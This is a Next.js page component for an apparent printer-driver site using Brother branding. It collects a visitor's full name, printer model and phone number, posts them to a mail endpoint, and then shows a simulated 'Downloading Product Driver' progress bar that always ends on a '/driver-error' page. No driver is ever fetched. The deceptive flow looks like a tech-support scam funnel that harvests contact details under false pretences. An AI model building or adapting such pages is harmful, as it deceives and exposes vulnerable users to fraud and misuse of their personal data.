"use client";

import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useState, useEffect } from "react";
import Footer from "../components/footer";
import Header from "../components/header";

  const hero = "/images/gif.gif";
  const printerImage = "/images/brother.png";

export default function BrotherPrinter() {
 const [bromodel, setBromodel] = useState("");
 const [fullName, setFullName] = useState("");
 const [phoneNumber, setPhoneNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(0);
  const router = useRouter();

  const totalSteps = 3;

  const handleSubmit = async (e) => {
  e.preventDefault();
  setLoading(true);
  setStep(0);

  try {
    const res = await fetch("/api/drivermail", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        fullName,
        phoneNumber,
        bromodel, // printer model
      }),
    });

    const data = await res.json();

    if (data.success) {
      let currentStep = 0;
      const interval = setInterval(() => {
        currentStep++;
        setStep(currentStep);
        if (currentStep >= totalSteps) {
          clearInterval(interval);
          setTimeout(() => router.push("/driver-error"), 1000);
        }
      }, 2000);
    } else {
      alert(data.message || "Failed to send email.");
      setLoading(false);
    }
  } catch (err) {
    console.error(err);
    alert("Error sending email.");
    setLoading(false);
  }
};


  return (
    <>
       <Header />
      {!loading ? (
        <>
<div className="min-h-screen bg-gray-100 flex flex-col items-center py-10">
      {/* Find Drivers Form */}
      <form
        className="bg-white p-6 rounded-lg shadow-lg flex flex-col md:flex-row gap-4 items-center"
        onSubmit={handleSubmit}
      >
 <input
          type="text"
          name="fullName"
          placeholder="Full Name"
         value={fullName}
          onChange={(e) => setFullName(e.target.value)}
          required
          className="border border-blue-500 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
        />
        <input
          type="text"
          name="printerModel"
          placeholder="Printer Model"
          value={bromodel}
          onChange={(e) => setBromodel(e.target.value)}
          required
          className="border border-blue-500 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
        />
        <input
          type="text"
          name="phoneNumber"
          placeholder="Phone Number"
         value={phoneNumber}
          onChange={(e) => setPhoneNumber(e.target.value)}
          required
          className="border border-blue-500 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
        />
        <button
          type="submit"
          className="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700 transition"
        >
          FIND DRIVERS
        </button>
      </form>

      {/* Printer Setup Section */}
      <div className="mt-12 flex flex-col md:flex-row items-center gap-10">
        <div className="flex-1">
          <h2 className="text-2xl font-bold mb-4">How to Setup Your Printer</h2>
          <p className="mb-6">
            Click Printer Setup for step by step guidance on how to setup, configure and register your printer.
          </p>
    
          <p className="mt-4 text-sm">
            For Assistance Please <Link href="/contact-us" className="text-blue-600 underline">Contact Us</Link>
          </p>
        </div>
        <div className="flex-1">
          <Image src={printerImage} width={800} height={480} alt="Printer Setup" />
        </div>
      </div>
    </div>
 <Footer/>
        </>
      ) : (
        

<>
<div className="loadinstepwrapper">
<div className="leftside">
<h1 className="broerrorheading">Driver Loading</h1>
</div>
<div className="mtside">
  <div className="p-8 flex flex-col items-center justify-center">
            <h3 className="text-xl">Downloading Product Driver</h3>
            <div
              style={{
                width: "80%",
                maxWidth: 400,
                height: 12,
                backgroundColor: "#e0e0e0",
                borderRadius: 8,
                overflow: "hidden",
                margin: "20px 0",
              }}
            >
              <div
                style={{
                  height: "100%",
                  width: `${(step / totalSteps) * 100}%`,
                  backgroundColor: "#4caf50",
                  transition: "width 0.5s ease-in-out",
                }}
              />
            </div>
            <p>
              {step} of {totalSteps} Please Wait…
            </p>
            <p>Connecting to Server</p>
          </div>
</div>
<div className="rightside">
                               <Image
                                     src={hero}
                                     alt="Product"
                                  width={500}
                                height={395}
                                    priority
                                       className=" object-contain"
                                  />
</div>
</div>
</>



      )}
    </>
  );
}
